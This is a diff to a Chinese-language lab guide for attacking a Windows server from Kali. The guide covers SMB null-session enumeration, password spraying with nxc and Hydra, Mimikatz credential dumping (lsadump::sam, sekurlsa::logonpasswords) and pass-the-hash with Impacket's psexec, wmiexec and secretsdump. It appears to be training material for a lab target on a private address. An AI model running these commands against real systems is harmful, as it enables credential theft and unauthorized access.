@@ -415,6 +415,20 @@ rpcclient -U "" 192.168.1.20 -c "enumdomusers"
 
 ## 三、实验步骤
 
+<aside>
+⚙️
+
+**Kali 攻击机工具准备**：实验开始前先安装可能缺失的工具：
+
+```bash
+sudo apt update && sudo apt install -y crowbar ncrack nbtscan enum4linux
+# CrackMapExec 在 Kali 2024+ 中已更名为 NetExec
+sudo apt install -y netexec
+# Hydra、smbclient、rpcclient、xfreerdp3 通常已预装
+```
+
+</aside>
+
 ### 阶段一：SMB空会话枚举（获取攻击面）
 
 <aside>
@@ -462,7 +476,7 @@ nbtscan 192.168.1.20
 smbclient -L //192.168.1.20 -N
 
 # 查看密码策略
-crackmapexec smb 192.168.1.20 --pass-pol
+nxc smb 192.168.1.20 --pass-pol
 
 # 预期输出（弱策略）：
 # [+] Password policy for domain:
@@ -527,13 +541,13 @@ hydra -L /tmp/users.txt -P /tmp/passwords.txt smb://192.168.1.20
 
 ```
 # 密码喷射：用同一个常见密码尝试所有用户
-crackmapexec smb 192.168.1.20 -u users.txt -p '123456'
-crackmapexec smb 192.168.1.20 -u users.txt -p 'admin123'
-crackmapexec smb 192.168.1.20 -u users.txt -p 'password'
+nxc smb 192.168.1.20 -u users.txt -p '123456'
+nxc smb 192.168.1.20 -u users.txt -p 'admin123'
+nxc smb 192.168.1.20 -u users.txt -p 'password'
 
 # 验证凭据是否有效
-crackmapexec smb 192.168.1.20 -u user1 -p '123456' --shares
-crackmapexec smb 192.168.1.20 -u weakadmin -p 'admin123' --shares
+nxc smb 192.168.1.20 -u user1 -p '123456' --shares
+nxc smb 192.168.1.20 -u weakadmin -p 'admin123' --shares
 ```
 
 <aside>
@@ -549,11 +563,6 @@ crackmapexec smb 192.168.1.20 -u weakadmin -p 'admin123' --shares
 # 使用Hydra进行RDP暴力破解（需靶机已禁用NLA，见初始化脚本第4步）
 hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://192.168.1.20
 
-# 使用Crowbar进行RDP爆破
-crowbar -b rdp -s 192.168.1.20/32 -U /tmp/users.txt -C /tmp/passwords.txt
-
-# 使用NCrack进行RDP爆破
-ncrack -vv -U /tmp/users.txt -P /tmp/passwords.txt rdp://192.168.1.20
 ```
 
 <aside>
@@ -566,10 +575,6 @@ ncrack -vv -U /tmp/users.txt -P /tmp/passwords.txt rdp://192.168.1.20
 **步骤6：破解成功后使用获取的凭据访问系统**
 
 ```
-# 使用CrackMapExec通过已获取的管理员凭据执行命令
-crackmapexec smb 192.168.1.20 -u weakadmin -p 'admin123' -x "whoami"
-crackmapexec smb 192.168.1.20 -u weakadmin -p 'admin123' -x "net user"
-crackmapexec smb 192.168.1.20 -u weakadmin -p 'admin123' -x "ipconfig /all"
 
 # 使用xfreerdp3远程桌面连接（Kali 2025.4）
 xfreerdp3 /v:192.168.1.20 /u:weakadmin /p:admin123 /cert:tofu
@@ -622,22 +627,41 @@ mimikatz.exe
 privilege::debug
 # 预期输出：Privilege '20' OK
 
+# 提升到 SYSTEM 令牌（Administrator 无法直接读取 SAM 注册表和 LSASS 内存）
+token::elevate
+# 预期输出：Token Id : ... ; User : NT AUTHORITY\SYSTEM
+
+# 导出本地SAM数据库中所有账户的哈希（从磁盘 SAM 文件读取）
+lsadump::sam
+# 输出示例（部分）：
+# Domain : WIN-XXXXX
+# SysKey : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+# ...
+# RID  : 000003ef (1007)
+# User : user1
+# Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0   （实际值取决于密码）
+#
+# RID  : 000003f2 (1010)
+# User : weakadmin
+# Hash NTLM: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
 # 从LSASS进程内存中提取登录用户凭据
 sekurlsa::logonpasswords
-
-# 输出示例（部分）：
+# 注意：Server 2025 的 LSASS 内部结构有变化，旧版 Mimikatz 可能报错：
+#   ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
+# 若遇到此错误，使用 lsadump::sam（上面已成功）或从 Kali 远程导出：
+#   impacket-secretsdump weakadmin:admin123@192.168.1.20
+#
+# 若 Mimikatz 版本支持 Server 2025，输出示例：
 # Authentication Id : 0 ; 123456 (00000000:0001e240)
 # Session           : Interactive from 2
 # User Name         : weakadmin
-# Domain            : TARGET-SERVER
+# Domain            : WIN-XXXXX
 # Password          : admin123          ← 明文密码！（需 WDigest 已启用 + 重登录）
-# NTLM              : 31d6cfe0d16ae931b73c59d7e0c089c0  （示例值，实际值取决于密码）
+# NTLM              : 31d6cfe0d16ae931b73c59d7e0c089c0
 #
 # 若 Password 显示 (null)，说明 WDigest 未生效或未重登录，
 # 此时 NTLM Hash 仍然可用，可继续后续 Pass-the-Hash 步骤。
-
-# 导出本地SAM数据库中所有账户的哈希
-lsadump::sam
 
 # 导出所有已缓存的凭据
 sekurlsa::credman
@@ -654,7 +678,10 @@ sekurlsa::credman
 
 ```bash
 # 在Mimikatz中使用NTLM哈希直接认证（无需明文密码）
-sekurlsa::pth /user:weakadmin /domain:. /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
+# 哈希值从上一步 lsadump::sam 的输出中获取
+sekurlsa::pth /user:weakadmin /domain:. /ntlm:<从lsadump::sam获取的哈希>
+# 注意：此命令依赖 LSASS 内存访问，Server 2025 上可能失败，
+# 请优先使用下方 Kali 端的 Impacket 方式。
 ```
 
 ```
@@ -662,10 +689,13 @@ sekurlsa::pth /user:weakadmin /domain:. /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
 # 注意：Kali 2024+ 中 Impacket 工具有两种调用方式：
 #   方式一（推荐）：直接使用命令名 impacket-psexec / impacket-wmiexec / impacket-smbexec
 #   方式二：python3 调用脚本路径
-impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
-# 或：psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
-impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
-impacket-smbexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
+# 哈希值从 lsadump::sam 或 impacket-secretsdump 输出中获取
+impacket-psexec -hashes :<NTLM哈希> weakadmin@192.168.1.20
+impacket-wmiexec -hashes :<NTLM哈希> weakadmin@192.168.1.20
+impacket-smbexec -hashes :<NTLM哈希> weakadmin@192.168.1.20
+
+# 也可直接远程导出所有凭据（无需在靶机上运行 Mimikatz）
+impacket-secretsdump weakadmin:admin123@192.168.1.20
 ```
 
 <aside>
